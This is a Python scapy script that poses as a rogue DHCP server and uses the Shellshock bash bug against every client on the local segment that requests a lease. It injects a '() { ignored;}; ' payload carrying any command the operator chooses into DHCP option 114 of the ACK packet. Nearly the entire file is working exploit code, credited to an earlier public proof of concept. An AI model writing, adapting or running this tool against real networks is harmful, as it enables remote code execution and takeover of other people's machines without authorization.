#!/usr/bin/env python3
# Description: Spoof a DHCP server and exploit all clients vulnerable to the 'ShellShock'
# Depends on:  scapy

# Based on the PoC from
# https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/

import binascii
import argparse
import logging

# Get rid of IPv6 ERROR when importing scapy
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *

parser = argparse.ArgumentParser(description="""
    Spoof a DHCP server and exploit all clients vulnerable to the
    'ShellShock' bug.

    Thx:
        https://github.com/byt3bl33d3r/DHCPShock,
        https://github.com/GHPS/DHCPShock.
""")
parser.add_argument('-i', '--iface', type=str, required=True,
                    help='Interface to use')
parser.add_argument('-c', '--cmd',   type=str,
                    help='Command to execute [default: "echo pwned"]')

args = parser.parse_args()

command = args.cmd or "echo 'pwned'"

if os.geteuid() != 0:
    sys.exit("Run me as r00t")

#DHCP in scapy == PAIN IN THE ASS OMG KILL ME NOW

#BOOTP
#siaddr = DHCP server ip
#yiaddr = ip offered to client
#xid = transaction id
#chaddr = clients mac address in binary format

def dhcp_offer(raw_mac, xid):
    packet = Ether(src=get_if_hwaddr(args.iface),
                   dst='ff:ff:ff:ff:ff:ff')/\
             IP(src="192.168.2.1", dst='255.255.255.255')/\
             UDP(sport=67, dport=68)/\
             BOOTP(op='BOOTREPLY', chaddr=raw_mac,
                   yiaddr='192.168.2.2', siaddr='192.168.2.1',
                   xid=xid)/\
             DHCP(options=[("message-type", "offer"),
                           ('server_id', '192.168.2.1'),
                           ('subnet_mask', '255.255.255.0'),
                           ('router', '192.168.2.1'),
                           ('lease_time', 172800),
                           ('renewal_time', 86400),
                           ('rebinding_time', 138240),
                            "end"])

    return packet


def dhcp_ack(raw_mac, xid, command):
    payload = str("() { ignored;}; " + command).encode('ASCII')
    packet = Ether(src=get_if_hwaddr(args.iface),
                   dst='ff:ff:ff:ff:ff:ff')/\
             IP(src="192.168.2.1", dst='255.255.255.255')/\
             UDP(sport=67, dport=68)/\
             BOOTP(op='BOOTREPLY', chaddr=raw_mac,
                   yiaddr='192.168.2.2', siaddr='192.168.2.1',
                   xid=xid)/\
             DHCP(options=[("message-type", "ack"),
                           ('server_id', '192.168.2.1'),
                           ('subnet_mask', '255.255.255.0'),
                           ('router', '192.168.2.1'),
                           ('lease_time', 172800),
                           ('renewal_time', 86400),
                           ('rebinding_time', 138240),
                           (114, payload),
                            "end"])

    return packet


def dhcp(resp):
    if resp.haslayer(DHCP):
        mac_addr = resp[Ether].src
        raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))

        if resp[DHCP].options[0][1] == 1:
            xid = resp[BOOTP].xid
            print("[*] Got dhcp DISCOVER from: " + mac_addr + " xid: "
                    + hex(xid))
            print("[*] Sending OFFER...")
            packet = dhcp_offer(raw_mac, xid)
            print(hexdump(packet))
            packet.show()
            sendp(packet, iface=args.iface)

        if resp[DHCP].options[0][1] == 3:
            xid = resp[BOOTP].xid
            print("[*] Got dhcp REQUEST from: " + mac_addr + " xid: "
                    + hex(xid))
            print("[*] Sending ACK...")
            packet = dhcp_ack(raw_mac, xid, command)
            #print(hexdump(packet))
            packet.show()
            sendp(packet, iface=args.iface)


print( "[*] Waiting for a DISCOVER...")
sniff(filter="udp and (port 67 or 68)", prn=dhcp, iface=args.iface)

# vim:sw=4:ts=4:sts=4:et:tw=71:cc=72
# End of file.
